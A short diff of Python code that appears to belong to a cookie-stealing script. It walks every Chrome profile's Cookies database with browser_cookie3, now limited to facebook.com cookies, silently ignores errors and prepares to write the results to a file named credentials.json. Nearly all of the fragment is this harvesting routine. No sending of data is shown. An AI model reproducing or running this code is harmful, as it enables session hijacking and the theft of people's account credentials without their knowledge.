@@ -23,8 +23,8 @@ for i in mid:
     try:
         coo = '\\'+ i + r'\Cookies'
         path_ = path+ coo
-        #cookies.append(list(browser_cookie3.chrome(path_, domain_name='facebook.com')))
-        cookies.append(list(browser_cookie3.chrome(path_)))
+        cookies.append(list(browser_cookie3.chrome(path_, domain_name='facebook.com')))
+        #cookies.append(list(browser_cookie3.chrome(path_)))
     except:
         pass
 filename = path+'\credentials.json'
